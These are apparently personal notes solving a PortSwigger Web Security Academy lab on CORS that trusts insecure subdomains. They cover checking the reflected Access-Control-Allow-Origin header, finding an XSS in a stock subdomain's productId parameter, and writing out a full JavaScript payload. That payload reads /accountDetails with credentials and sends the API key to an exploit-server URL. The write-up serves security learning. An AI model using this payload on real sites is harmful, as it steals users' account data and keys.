Steps to check. Remember to put https://, some times it doesnt works
![[Pasted image 20250801201731.png]]
First we checked that if we change the sub-domain the response shows ACAO(access control allow origin) with the sub-domain included
1. Send the request to Burp Repeater, and resubmit it with the added header `Origin: http://subdomain.lab-id` where `lab-id` is the lab domain name.
2. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.

![[Pasted image 20250214180745.png]]

We need to find a XXS, which is on the stock request in the productID parameter. The capture below shows the vulnerability
![[Pasted image 20250214182807.png]]
Then we can send this script to get the API Key

```JS
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"</script>
```

This is other solution from one of the videos. On the second screenshot she removed all the spaces because we need a long line like the above one
![[Pasted image 20250801203012.png]]
Also here we need to change to, in this case, the server that the lab gave us.
![[Pasted image 20250801203410.png]]